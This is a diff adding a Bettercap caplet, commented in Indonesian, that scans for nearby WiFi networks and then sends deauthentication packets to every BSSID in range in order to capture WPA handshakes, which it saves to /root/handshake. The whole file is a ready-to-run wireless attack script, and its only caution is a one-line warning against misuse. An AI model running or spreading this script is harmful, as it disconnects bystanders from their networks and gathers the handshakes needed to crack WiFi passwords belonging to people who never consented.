@@ -1,0 +1,53 @@
+#-------------------------------------
+#
+# Caplet Bettercap
+#
+# Peringatran: jangan disalahgunakan!
+#
+#-------------------------------------
+
+# Membersihkan layar terminal
+clear
+
+# Seting interface yang ingin digunakan
+# set wifi.interface wlan0
+
+# Seting output folder
+set wifi.handshakes.file /root/handshake
+
+# Seting aggregate (biar outputnya kaga nyatu)
+set wifi.handshakes.aggregate false
+
+# Mengaktifkan modul wifi untuk mencari target wifi yang ada disekitar
+wifi.recon on
+
+# Jeda 20 detik untuk memaksimalkan hasil scanning
+sleep 20
+
+# Seting perintah ticker untuk membersihkan layar terminal dan menampilkan semau target wifi yang ditemukan
+set ticker.commands clear; wifi.show
+
+# Mengaktifkan modul ticker
+ticker on
+
+# Jeda 10 detik untuk menampikan semua target wifi yang ditemukan
+sleep 10
+
+# Menonaktifkan modul ticker
+ticker off
+
+# Lewati proses pengiriman association request (skip PMKID)
+#
+# * = semua BSSID
+set wifi.assoc.skip *
+
+# Kirim deauth packet untuk mencapture handshake
+#
+# * = semua BSSID
+wifi.deauth *
+
+# Jeda 20 detik untuk memaksimalkan proses deauth
+sleep 20
+
+# Keluar dari bettercap
+exit
